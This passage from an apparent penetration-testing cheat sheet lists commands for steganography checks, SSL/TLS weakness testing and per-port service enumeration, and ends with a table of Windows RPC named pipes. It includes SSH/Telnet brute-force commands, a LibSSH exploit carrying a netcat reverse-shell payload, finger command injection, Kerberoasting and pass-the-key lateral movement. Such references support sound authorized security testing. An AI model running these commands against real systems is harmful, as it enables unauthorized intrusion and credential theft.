guestmount --add yourVirtualDisk.vhdx --inspector --ro /mnt/anydirectory
</code></pre>
<h3 id="audio"><a class="header" href="#audio">Audio</a></h3>
<pre><code class="language-bash"># Check spectrogram
wget https://code.soundsoftware.ac.uk/attachments/download/2561/sonic-visualiser_4.0_amd64.deb
dpkg -i sonic-visualiser_4.0_amd64.deb

# Check for Stego
hideme stego.mp3 -f &amp;&amp; cat output.txt #AudioStego
</code></pre>
<h3 id="images"><a class="header" href="#images">Images</a></h3>
<pre><code class="language-bash"># Stego
wget http://www.caesum.com/handbook/Stegsolve.jar -O stegsolve.jar
chmod +x stegsolve.jar
java -jar stegsolve.jar

# Stegpy
stegpy -p file.png

# Check png corrupted
pngcheck -v image.jpeg

# Check what kind of image is
identify -verbose image.jpeg

# Stegseek
# https://github.com/RickdeJager/stegseek
stegseek --seed file.jpg
stegseek file.jpg rockyou.txt 
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="ssltls"><a class="header" href="#ssltls">SSL/TLS</a></h1>
<h2 id="drown"><a class="header" href="#drown">DROWN</a></h2>
<pre><code class="language-bash"># Check for "SSLv2 supported"
nmap –p- –sV –sC example.com
</code></pre>
<h2 id="tls_fallback_scsv"><a class="header" href="#tls_fallback_scsv">TLS_FALLBACK_SCSV</a></h2>
<pre><code class="language-bash"># Check in the lower port
openssl s_client –tls1 -fallback_scsv -connect example.com:443
# - Response:
# tlsv1 alert inappropriate fallback:s3_pkt.c:1262:SSL alert number 86
</code></pre>
<h2 id="beast"><a class="header" href="#beast">BEAST</a></h2>
<pre><code class="language-bash"># TLSv1.0 and CBC ciphers
openssl s_client -[sslv3/tls1] -cipher CBC_CIPHER -connect example.com:443
</code></pre>
<h2 id="lucky13"><a class="header" href="#lucky13">LUCKY13</a></h2>
<pre><code class="language-bash">openssl s_client -cipher CBC_CIPHER -connect example.com:443
</code></pre>
<h2 id="sweet32"><a class="header" href="#sweet32">Sweet32</a></h2>
<pre><code class="language-bash">openssl s_client -cipher 3DES -connect example.com:443
</code></pre>
<h2 id="logjam"><a class="header" href="#logjam">Logjam</a></h2>
<pre><code class="language-bash"># Check the "Server Temp Key" response is bigger than 1024 (only in OpenSSL 1.0.2 or better)
openssl s_client -connect www.example.com:443 -cipher "EDH"
</code></pre>
<h2 id="sslv2-support"><a class="header" href="#sslv2-support">SSLv2 Support</a></h2>
<pre><code class="language-bash"># If is supported this will return the server certificate information if not, error
openssl s_client –ssl2 -connect example.com:443
</code></pre>
<h2 id="sslv3-support"><a class="header" href="#sslv3-support">SSLv3 Support</a></h2>
<pre><code class="language-bash"># If is supported this will return the server certificate information if not, error
openssl s_client -ssl3 -connect google.com:443
</code></pre>
<h2 id="cipher-suites"><a class="header" href="#cipher-suites">Cipher suites</a></h2>
<pre><code class="language-bash"># Cipher Suites
nmap --script ssl-enum-ciphers -p 443 example.com

# - Anon cypher (fail)
openssl s_client -cipher aNULL -connect example.com:443

# - DES Cipher (fail)
openssl s_client -cipher DES -connect example.com:443

# - 3DES Cipher (fail)
openssl s_client -cipher 3DES -connect example.com:443

# - Export Cipher (fail)
openssl s_client -cipher EXPORT -connect example.com:443

# - Low Cipher (fail)
openssl s_client -cipher LOW -connect example.com:443

# - RC4 Cipher (fail)
openssl s_client -cipher RC4 -connect example.com:443

# - NULL Cipher (fail)
openssl s_client -cipher NULL -connect example.com:443

# - Perfect Forward Secrecy Cipher (This should NOT fail):
openssl s_client -cipher EECDH, EDH NULL -connect example.com:443
</code></pre>
<h2 id="secure-renegotiation"><a class="header" href="#secure-renegotiation">Secure renegotiation</a></h2>
<pre><code class="language-bash"># Check secure renegotiation is not supported
# If not, send request in the renegotiation
# Once sent, if it's vulnerable it shouldn't return error
openssl s_client -connect example.com:443
HEAD / HTTP/1.0
R
# &lt;Enter or Return key&gt;
</code></pre>
<h2 id="crime"><a class="header" href="#crime">CRIME</a></h2>
<pre><code class="language-bash"># Check for "Compression: NONE"
openssl s_client -connect example.com:443
</code></pre>
<h2 id="breach"><a class="header" href="#breach">BREACH</a></h2>
<pre><code class="language-bash"># If the response contains encoded data, host is vulnerable
openssl s_client -connect example.com:443
GET / HTTP/1.1
Host: example.com
Accept-Encoding: compress, gzip
</code></pre>
<h2 id="heartbleed"><a class="header" href="#heartbleed">Heartbleed</a></h2>
<pre><code class="language-bash"># Heartbleed
nmap -p 443 --script ssl-heartbleed --script-args vulns.showall example.com

# Heartbleed checker oneliner from sites list
cat list.txt | while read line ; do echo "QUIT" | openssl s_client -connect $line:443 2&gt;&amp;1 | grep 'server extension "heartbeat" (id=15)' || echo $line: safe; done
</code></pre>
<h2 id="change-cipher-spec-injection"><a class="header" href="#change-cipher-spec-injection">Change cipher spec injection</a></h2>
<pre><code class="language-bash">nmap -p 443 --script ssl-ccs-injection example.com
</code></pre>
<h2 id="cipher-order-enforcement"><a class="header" href="#cipher-order-enforcement">Cipher order enforcement</a></h2>
<pre><code class="language-bash"># Choose a protocol and 2 different ciphers, one stronger than other
# Make 2 request with different cipher order anc check in the response if the cipher is the first of the request in both cases
nmap -p 443 --script ssl-enum-ciphers example.com
openssl s_client –tls1_2 –cipher ‘AES128-GCM-SHA256:AES128-SHA’ –connect contextis.co.uk:443
openssl s_client –tls1_2 –cipher ‘AES128-SHA:AES128-GCM-SHA256’ –connect contextis.co.uk:443
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="ports"><a class="header" href="#ports">Ports</a></h1>
<h2 id="general"><a class="header" href="#general">General</a></h2>
<p>AIO <a href="http://0daysecurity.com/penetration-testing/enumeration.html">Penetration Testing Methodology - 0DAYsecurity.com</a></p>
<h2 id="port-21---ftp"><a class="header" href="#port-21---ftp">Port 21 - FTP</a></h2>
<pre><code class="language-bash">nmap --script ftp-* -p 21 10.11.1.111
</code></pre>
<h2 id="port-22---ssh"><a class="header" href="#port-22---ssh">Port 22 - SSH</a></h2>
<ul>
<li>If you have usernames test login with username:username</li>
<li>Vulnerable Versions to user enum: &lt;7.7</li>
</ul>
<pre><code class="language-bash"># Enum SSH
# Get version
nmap 10.11.1.1 -p22 -sV
# Get banner
nc 10.11.1.1 22
# Get login banner
ssh root@10.11.11.1
# Get algorythms supporteed
nmap -p22 10.11.1.1 --script ssh2-enum-algos
# Check weak keys
nmap-p22 10.2.1.1 --script ssh-hostkey --script-args ssh_hostkey=full
# Check auth methods
nmap -p22 10.11.1.1 --script ssh-auth-methods --script-args="ssh.user=admin"

# User can ask to execute a command right after authentication before it’s default command or shell is executed
$ ssh -v user@10.10.1.111 id
...
Password:
debug1: Authentication succeeded (keyboard-interactive).
Authenticated to 10.10.1.111 ([10.10.1.1114]:22).
debug1: channel 0: new [client-session]
debug1: Requesting no-more-sessions@openssh.com
debug1: Entering interactive session.
debug1: pledge: network
debug1: client_input_global_request: rtype hostkeys-00@openssh.com want_reply 0
debug1: Sending command: id
debug1: client_input_channel_req: channel 0 rtype exit-status reply 0
debug1: client_input_channel_req: channel 0 rtype eow@openssh.com reply 0
uid=1000(user) gid=100(users) groups=100(users)
debug1: channel 0: free: client-session, nchannels 1
Transferred: sent 2412, received 2480 bytes, in 0.1 seconds
Bytes per second: sent 43133.4, received 44349.5
debug1: Exit status 0

# Check Auth Methods:
$ ssh -v 10.10.1.111
OpenSSH_8.1p1, OpenSSL 1.1.1d  10 Sep 2019
...
debug1: Authentications that can continue: publickey,password,keyboard-interactive

# Force Auth Method:
$ ssh -v 10.10.1.111 -o PreferredAuthentications=password
...
debug1: Next authentication method: password

# BruteForce:
patator ssh_login host=10.11.1.111 port=22 user=root 0=/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt password=FILE0 -x ignore:mesg='Authentication failed.'
hydra -l user -P /usr/share/wordlists/password/rockyou.txt -e s ssh://10.10.1.111
medusa -h 10.10.1.111 -u user -P /usr/share/wordlists/password/rockyou.txt -e s -M ssh
ncrack --user user -P /usr/share/wordlists/password/rockyou.txt ssh://10.10.1.111

# LibSSH Before 0.7.6 and 0.8.4 - LibSSH 0.7.6 / 0.8.4 - Unauthorized Access 
# Id
python /usr/share/exploitdb/exploits/linux/remote/46307.py 10.10.1.111 22 id
# Reverse
python /usr/share/exploitdb/exploits/linux/remote/46307.py 10.10.1.111 22 "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.1.111 80 &gt;/tmp/f"

# SSH FUZZ
# https://dl.packetstormsecurity.net/fuzzer/sshfuzz.txt

# cpan Net::SSH2
./sshfuzz.pl -H 10.10.1.111 -P 22 -u user -p user

use auxiliary/fuzzers/ssh/ssh_version_2

# SSH-AUDIT
# https://github.com/arthepsy/ssh-audit                     

# Enum users &lt; 7.7:
# https://www.exploit-db.com/exploits/45233
https://github.com/CaioCGH/EP4-redes/blob/master/attacker/sshUsernameEnumExploit.py
python ssh_user_enum.py --port 2223 --userList /root/Downloads/users.txt IP 2&gt;/dev/null | grep "is a"

# SSH Leaks:
https://shhgit.darkport.co.uk/

# SSH bruteforce
# https://github.com/kitabisa/ssb
</code></pre>
<h2 id="port-23---telnet"><a class="header" href="#port-23---telnet">Port 23 - Telnet</a></h2>
<pre><code class="language-bash"># Get banner
telnet 10.11.1.110
# Bruteforce password
patator telnet_login host=10.11.1.110 inputs='FILE0\nFILE1' 0=/root/Desktop/user.txt 1=/root/Desktop/pass.txt  persistent=0 prompt_re='Username: | Password:'
</code></pre>
<h2 id="port-25---smtp"><a class="header" href="#port-25---smtp">Port 25 - SMTP</a></h2>
<pre><code class="language-bash">nc -nvv 10.11.1.111 25
HELO foo

telnet 10.11.1.111 25
VRFY root

nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 10.11.1.111
smtp-user-enum -M VRFY -U /root/sectools/SecLists/Usernames/Names/names.txt -t 10.11.1.111

# SMTP relay
msfconsole
use auxiliary/scanner/smtp/smtp_relay
set RHOSTS &lt;IP or File&gt;
set MAILFROM &lt;PoC email address&gt;
set MAILTO &lt;your email address&gt;
run

# Send email unauth:

MAIL FROM:admin@admin.com
RCPT TO:DestinationEmail@DestinationDomain.com
DATA
test

.

Receive:
250 OK
</code></pre>
<h2 id="port-43---whois"><a class="header" href="#port-43---whois">Port 43 - Whois</a></h2>
<pre><code class="language-bash">whois -h 10.10.1.111 -p 43 "domain.com"
echo "domain.com" | nc -vn 10.10.1.111 43
whois -h 10.10.1.111 -p 43 "a') or 1=1#"
</code></pre>
<h2 id="port-53---dns"><a class="header" href="#port-53---dns">Port 53 - DNS</a></h2>
<pre><code class="language-bash"># Transfer zone

dig AXFR domain.com @10.10.10.10
# dig +multi AXFR @ns1.insecuredns.com insecuredns.com
dnsrecon -t axfr -d domain
fierce -dns domain.com
</code></pre>
<h2 id="port-69---udp---tftp"><a class="header" href="#port-69---udp---tftp">Port 69 - UDP - TFTP</a></h2>
<ul>
<li>Vulns tftp in server 1.3, 1.4, 1.9, 2.1, and a few more.</li>
<li>Same checks as FTP Port 21.</li>
</ul>
<pre><code class="language-bash">nmap -p69 --script=tftp-enum.nse 10.11.1.111
</code></pre>
<h2 id="port-79---finger"><a class="header" href="#port-79---finger">Port 79 - Finger</a></h2>
<pre><code class="language-bash">nc -vn 10.11.1.111 79
echo "root" | nc -vn 10.11.1.111 79

# User enumeration
finger @10.11.1.111       #List users
finger admin@10.11.1.111  #Get info of user
finger user@10.11.1.111   #Get info of user

finger "|/bin/id@example.com"
finger "|/bin/ls -a /@example.com"
</code></pre>
<h2 id="port-88---kerberos"><a class="header" href="#port-88---kerberos">Port 88 - Kerberos</a></h2>
<p>Check <a href="enumeration/../post-exploitation/windows/ad/kerberos-attacks.html">Kerberos dedicated</a> section</p>
<pre><code class="language-bash">nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN.LOCAL'" IP
use auxiliary/gather/kerberos_enumusers # MSF

# Check for Kerberoasting: 
GetNPUsers.py DOMAIN-Target/ -usersfile user.txt -dc-ip &lt;IP&gt; -format hashcat/john

# GetUserSPNs
ASREPRoast:
impacket-GetUserSPNs &lt;domain_name&gt;/&lt;domain_user&gt;:&lt;domain_user_password&gt; -request -format &lt;AS_REP_responses_format [hashcat | john]&gt; -outputfile &lt;output_AS_REP_responses_file&gt;
impacket-GetUserSPNs &lt;domain_name&gt;/ -usersfile &lt;users_file&gt; -format &lt;AS_REP_responses_format [hashcat | john]&gt; -outputfile &lt;output_AS_REP_responses_file&gt;

# Kerberoasting: 
impacket-GetUserSPNs &lt;domain_name&gt;/&lt;domain_user&gt;:&lt;domain_user_password&gt; -outputfile &lt;output_TGSs_file&gt; 

# Overpass The Hash/Pass The Key (PTK):
python3 getTGT.py &lt;domain_name&gt;/&lt;user_name&gt; -hashes [lm_hash]:&lt;ntlm_hash&gt;
python3 getTGT.py &lt;domain_name&gt;/&lt;user_name&gt; -aesKey &lt;aes_key&gt;
python3 getTGT.py &lt;domain_name&gt;/&lt;user_name&gt;:[password]

# Using TGT key to excute remote commands from the following impacket scripts:

python3 psexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass
python3 smbexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass
python3 wmiexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass

# https://www.tarlogic.com/blog/como-funciona-kerberos/
# https://www.tarlogic.com/blog/como-atacar-kerberos/

python kerbrute.py -dc-ip IP -users /root/htb/kb_users.txt -passwords /root/pass_common_plus.txt -threads 20 -domain DOMAIN -outputfile kb_extracted_passwords.txt

# https://blog.stealthbits.com/extracting-service-account-passwords-with-kerberoasting/
# https://github.com/GhostPack/Rubeus
# https://github.com/fireeye/SSSDKCMExtractor
# https://gitlab.com/Zer1t0/cerbero
</code></pre>
<h2 id="port-110---pop3"><a class="header" href="#port-110---pop3">Port 110 - Pop3</a></h2>
<pre><code class="language-bash">telnet 10.11.1.111
USER pelle@10.11.1.111
PASS admin

# or:

USER pelle
PASS admin

# List all emails
list

# Retrieve email number 5, for example
retr 9
</code></pre>
<h2 id="port-111---rpcbind"><a class="header" href="#port-111---rpcbind">Port 111 - Rpcbind</a></h2>
<pre><code class="language-bash">rpcinfo -p 10.11.1.111
rpcclient -U "" 10.11.1.111
    srvinfo
    enumdomusers
    getdompwinfo
    querydominfo
    netshareenum
    netshareenumall
</code></pre>
<h2 id="port-135---msrpc"><a class="header" href="#port-135---msrpc">Port 135 - MSRPC</a></h2>
<p>Some versions are vulnerable.</p>
<pre><code class="language-bash">nmap 10.11.1.111 --script=msrpc-enum
msf &gt; use exploit/windows/dcerpc/ms03_026_dcom

# Endpoint Mapper Service Discovery
use auxiliary/scanner/dcerpc/endpoint_mapper

#Hidden DCERPC Service Discovery
use auxiliary/scanner/dcerpc/hidden

# Remote Management Interface Discovery
use auxiliary/scanner/dcerpc/management

# DCERPC TCP Service Auditor
use auxiliary/scanner/dcerpc/tcp_dcerpc_auditor

impacket-rpcdump

# Enum network interface
# https://github.com/mubix/IOXIDResolver
</code></pre>
<div class="table-wrapper"><table><thead><tr><th>Named pipe</th><th>Description</th><th>Service or process</th><th>Interface identifier</th></tr></thead><tbody>
</tbody></table>
</div><div class="table-wrapper"><table><thead><tr><th>atsvc</th><th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_scheduler.html">atsvc</a> interface (Scheduler service)</th><th>mstask.exe</th><th>1ff70682-0a51-30e8-076d-740be8cee98b v1.0</th></tr></thead><tbody>
</tbody></table>
</div><div class="table-wrapper"><table><thead><tr><th>AudioSrv</th><th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_audio.html">AudioSrv</a> interface (Windows Audio service)</th><th>AudioSrv</th><th>3faf4738-3a21-4307-b46c-fdda9bb8c0d5 v1.0</th></tr></thead><tbody>
</tbody></table>
</div><div class="table-wrapper"><table><thead><tr><th>browser (ntsvcs alias)</th><th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_browser.html">browser</a> interface (Computer Browser service)</th><th>Browser</th><th>6bffd098-a112-3610-9833-012892020162 v0.0</th></tr></thead><tbody>
</tbody></table>
</div><div class="table-wrapper"><table><thead><tr><th>cert</th><th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_certsrv.html">ICertPassage</a> interface (Certificate services)</th><th>certsrv.exe</th><th>91ae6020-9e3c-11cf-8d7c-00aa00c091be v0.0</th></tr></thead><tbody>
</tbody></table>
</div><div class="table-wrapper"><table><thead><tr><th>Ctx_Winstation_API_Service</th><th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_termsrv.html">winstation_rpc</a> interface</th><th>termsrv.exe</th><th>5ca4a760-ebb1-11cf-8611-00a0245420ed v1.0</th></tr></thead><tbody>
</tbody></table>
</div><div class="table-wrapper"><table><thead><tr><th>DAV RPC SERVICE</th><th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_davclntrpc.html">davclntrpc</a> interface (WebDAV client service)</th><th>WebClient</th><th>c8cb7687-e6d3-11d2-a958-00c04f682e16 v1.0</th></tr></thead><tbody>
</tbody></table>
</div><div class="table-wrapper"><table><thead><tr><th>dnsserver</th><th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_dns.html">DnsServer</a> interface (DNS Server service)</th><th>dns.exe</th><th>50abc2a4-574d-40b3-9d66-ee4fd5fba076 v5.0</th></tr></thead><tbody>
</tbody></table>
</div><div class="table-wrapper"><table><thead><tr><th>epmapper</th><th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/rpcss_msrpc_interfaces.html">epmp</a> interface (RPC endpoint mapper)</th><th>RpcSs</th><th>e1af8308-5d1f-11c9-91a4-08002b14a0fa v3.0</th></tr></thead><tbody>
</tbody></table>
</div><div class="table-wrapper"><table><thead><tr><th>eventlog (ntsvcs alias)</th><th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_eventlog.html">eventlog</a> interface (Eventlog service)</th><th>Eventlog</th><th>82273fdc-e32a-18c3-3f78-827929dc23ea v0.0</th></tr></thead><tbody>
</tbody></table>
</div><div class="table-wrapper"><table><thead><tr><th>HydraLsPipe</th><th>Terminal Server Licensing</th><th>lserver.exe</th><th>3d267954-eeb7-11d1-b94e-00c04fa3080d v1.0</th></tr></thead><tbody>
</tbody></table>
</div><div class="table-wrapper"><table><thead><tr><th>InitShutdown</th><th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_winlogon_w2k.html">InitShutdown</a> interface</th><th>winlogon.exe</th><th>894de0c0-0d55-11d3-a322-00c04fa321a1 v1.0</th></tr></thead><tbody>
</tbody></table>
</div><div class="table-wrapper"><table><thead><tr><th>keysvc</th><th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_cryptsvc.html">IKeySvc</a> interface (Cryptographic services)</th><th>CryptSvc</th><th>8d0ffe72-d252-11d0-bf8f-00c04fd9126b v1.0</th></tr></thead><tbody>
</tbody></table>
</div><div class="table-wrapper"><table><thead><tr><th>keysvc</th><th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_cryptsvc.html">ICertProtect</a> interface (Cryptographic services)</th><th>CryptSvc</th><th>0d72a7d4-6148-11d1-b4aa-00c04fb66ea0 v1.0</th></tr></thead><tbody>
</tbody></table>
</div><div class="table-wrapper"><table><thead><tr><th>locator</th><th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_locator.html">NsiS</a> interface (RPC Locator service)</th><th>locator.exe</th><th>d6d70ef0-0e3b-11cb-acc3-08002b1d29c4 v1.0</th></tr></thead><tbody>
</tbody></table>
</div><div class="table-wrapper"><table><thead><tr><th>llsrpc</th><th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_llsrpc.html">llsrpc</a> interface (Licensing Logging service)</th><th>llssrv.exe</th><th>342cfd40-3c6c-11ce-a893-08002b2e9c6d v0.0</th></tr></thead><tbody>
</tbody></table>
</div><div class="table-wrapper"><table><thead><tr><th>lsarpc (lsass alias)</th><th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_lsarpc.html">lsarpc</a> interface</th><th>lsass.exe</th><th>12345778-1234-abcd-ef00-0123456789ab v0.0</th></tr></thead><tbody>
</tbody></table>
</div><div class="table-wrapper"><table><thead><tr><th>lsarpc (lsass alias)</th><th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_dssetup.html">dssetup</a> interface</th><th>lsass.exe</th><th>3919286a-b10c-11d0-9ba8-00c04fd92ef5 v0.0</th></tr></thead><tbody>
</tbody></table>
</div><div class="table-wrapper"><table><thead><tr><th>msgsvc (ntsvcs alias)</th><th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_msgsvc.html">msgsvcsend</a> interface (Messenger service)</th><th>messenger</th><th>5a7b91f8-ff00-11d0-a9b2-00c04fb6e6fc v1.0</th></tr></thead><tbody>
</tbody></table>
</div><div class="table-wrapper"><table><thead><tr><th>nddeapi</th><th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_nddeapi.html">nddeapi</a> interface (NetDDE service)</th><th>netdde.exe</th><th>2f5f3220-c126-1076-b549-074d078619da v1.2</th></tr></thead><tbody>
</tbody></table>
</div><div class="table-wrapper"><table><thead><tr><th>netdfs</th><th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_netdfs.html">netdfs</a> interface (Distributed File System service)</th><th>Dfssvc</th><th>4fc742e0-4a10-11cf-8273-00aa004ae673 v3.0</th></tr></thead><tbody>
</tbody></table>
</div><div class="table-wrapper"><table><thead><tr><th>netlogon (lsass alias)</th><th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_netlogon.html">netlogon</a> interface (Net Logon service)</th><th>Netlogon</th><th>12345678-1234-abcd-ef00-01234567cffb v1.0</th></tr></thead><tbody>
</tbody></table>
</div><div class="table-wrapper"><table><thead><tr><th>ntsvcs</th><th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_pnp.html">pnp</a> interface (Plug and Play service)</th><th>PlugPlay</th><th>8d9f4e40-a03d-11ce-8f69-08003e30051b v1.0</th></tr></thead><tbody>
</tbody></table>
</div><div class="table-wrapper"><table><thead><tr><th>plugplay</th><th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_pnp.html">pnp</a> interface (Plug and Play Windows Vista service)</th><th>PlugPlay</th><th>8d9f4e40-a03d-11ce-8f69-08003e30051b v1.0</th></tr></thead><tbody>
</tbody></table>
</div><div class="table-wrapper"><table><thead><tr><th>policyagent</th><th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_ipsec_w2k.html">PolicyAgent</a> interface (IPSEC Policy Agent (Windows 2000))</th><th>PolicyAgent</th><th>d335b8f6-cb31-11d0-b0f9-006097ba4e54 v1.5</th></tr></thead><tbody>
</tbody></table>
</div><div class="table-wrapper"><table><thead><tr><th>ipsec</th><th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_winipsec.html">winipsec</a> interface (IPsec Services)</th><th>PolicyAgent</th><th>12345678-1234-abcd-ef00-0123456789ab v1.0</th></tr></thead><tbody>
</tbody></table>
</div><div class="table-wrapper"><table><thead><tr><th>ProfMapApi</th><th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_winlogon_w2k.html">pmapapi</a> interface</th><th>winlogon.exe</th><th>369ce4f0-0fdc-11d3-bde8-00c04f8eee78 v1.0</th></tr></thead><tbody>
</tbody></table>
</div><div class="table-wrapper"><table><thead><tr><th>protected_storage</th><th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_protected_storage.html">IPStoreProv</a> interface (Protected Storage)</th><th>lsass.exe</th><th>c9378ff1-16f7-11d0-a0b2-00aa0061426a v1.0</th></tr></thead><tbody>
</tbody></table>
</div><div class="table-wrapper"><table><thead><tr><th>ROUTER</th><th>Remote Access</th><th>mprdim.dll</th><th>8f09f000-b7ed-11ce-bbd2-00001a181cad v0.0</th></tr></thead><tbody>
</tbody></table>
</div><div class="table-wrapper"><table><thead><tr><th>samr (lsass alias)</th><th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_samr.html">samr</a> interface</th><th>lsass.exe</th><th>12345778-1234-abcd-ef00-0123456789ac v1.0</th></tr></thead><tbody>
</tbody></table>
</div><div class="table-wrapper"><table><thead><tr><th>scerpc</th><th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_sce.html">SceSvc</a></th><th>services.exe</th><th>93149ca2-973b-11d1-8c39-00c04fb984f9 v0.0</th></tr></thead><tbody>
</tbody></table>
</div><div class="table-wrapper"><table><thead><tr><th>SECLOGON</th><th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_seclogon.html">ISeclogon</a> interface (Secondary logon service)</th><th>seclogon</th><th>12b81e99-f207-4a4c-85d3-77b42f76fd14 v1.0</th></tr></thead><tbody>
</tbody></table>
</div><div class="table-wrapper"><table><thead><tr><th>SfcApi</th><th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_sfcapi.html">sfcapi</a> interface (Windows File Protection)</th><th>winlogon.exe</th><th>83da7c00-e84f-11d2-9807-00c04f8ec850 v2.0</th></tr></thead><tbody>
</tbody></table>
</div><div class="table-wrapper"><table><thead><tr><th>spoolss</th><th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_spoolss.html">spoolss</a> interface (Spooler service)</th><th>spoolsv.exe</th><th>12345678-1234-abcd-ef00-0123456789ab v1.0</th></tr></thead><tbody>
</tbody></table>
</div><div class="table-wrapper"><table><thead><tr><th>srvsvc (ntsvcs alias)</th><th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_srvsvc.html">srvsvc</a> interface (Server service)</th><th>services.exe (w2k) or svchost.exe (wxp and w2k3)</th><th>4b324fc8-1670-01d3-1278-5a47bf6ee188 v3.0</th></tr></thead><tbody>
</tbody></table>
</div><div class="table-wrapper"><table><thead><tr><th>ssdpsrv</th><th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_ssdpsrv.html">ssdpsrv</a> interface (SSDP service)</th><th>ssdpsrv</th><th>4b112204-0e19-11d3-b42b-0000f81feb9f v1.0</th></tr></thead><tbody>
</tbody></table>
</div><div class="table-wrapper"><table><thead><tr><th>svcctl (ntsvcs alias)</th><th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_svcctl.html">svcctl</a> interface (Services control manager)</th><th>services.exe</th><th>367aeb81-9844-35f1-ad32-98f038001003 v2.0</th></tr></thead><tbody>
</tbody></table>
</div><div class="table-wrapper"><table><thead><tr><th>tapsrv</th><th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_tapsrv.html">tapsrv</a> interface (Telephony service)</th><th>Tapisrv</th><th>2f5f6520-ca46-1067-b319-00dd010662da v1.0</th></tr></thead><tbody>
</tbody></table>
</div><div class="table-wrapper"><table><thead><tr><th>trkwks</th><th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_trkwks.html">trkwks</a> interface (Distributed Link Tracking Client)</th><th>Trkwks</th><th>300f3532-38cc-11d0-a3f0-0020af6b0add v1.2</th></tr></thead><tbody>
</tbody></table>
</div><div class="table-wrapper"><table><thead><tr><th>W32TIME (ntsvcs alias)</th><th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_w32time.html">w32time</a> interface (Windows Time (Windows 2000 and XP))</th><th>w32time</th><th>8fb6d884-2388-11d0-8c35-00c04fda2795 v4.1</th></tr></thead><tbody>
</tbody></table>
</div><div class="table-wrapper"><table><thead><tr><th>W32TIME_ALT</th><th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_w32time.html">w32time</a> interface (Windows Time (Windows Server 2003, Windows Vista))</th><th>w32time</th><th>8fb6d884-2388-11d0-8c35-00c04fda2795 v4.1</th></tr></thead><tbody>
</tbody></table>
</div><div class="table-wrapper"><table><thead><tr><th>winlogonrpc</th><th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_winlogon_w2k.html">GetUserToken</a> interface</th><th>winlogon.exe</th><th>a002b3a0-c9b7-11d1-ae88-0080c75e4ec1 v1.0</th></tr></thead><tbody>
</tbody></table>
